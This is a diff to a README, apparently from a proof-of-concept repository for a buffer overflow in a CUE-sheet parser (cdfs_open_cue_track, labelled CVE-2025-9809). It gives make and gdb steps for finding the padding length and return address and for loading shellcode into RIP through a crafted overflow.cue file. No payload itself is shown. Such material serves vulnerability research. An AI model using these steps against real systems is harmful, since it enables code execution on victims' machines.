@@ -1,12 +1,40 @@
 # README
 
-```bash
-docker run -it --name cve-2025-9809 -v "$(pwd):/app" cve-docker /bin/bash
-```
+## Compile
 
 ```bash
-make exploit
-make run
-# Removes the exploit
 make clean
+make exploit
+```
+
+## How it works (good case)
+```bash
+gdb exploit
+(gdb) run good_case.cue
+```
+
+## Get the target IP address (RIP) and paddhing length
+
+```bash
+break cdfs_open_cue_track:475
+run test_payload.cue
+p &current_track_path
+info frame
+p 0x7fffffffdc28 - 0x7fffffffd3d0
+
+# to see the rbp overwrite
+c
+info frame
+p $rbp
+quit 
+```
+
+## Use obtained paddhing length and target ip to insert malicious operation into RIP
+```bash
+gdb exploit
+run overflow.cue
+
+# test other shellcode
+python3 genearte_payload.py
+run overflow.cue
 ```
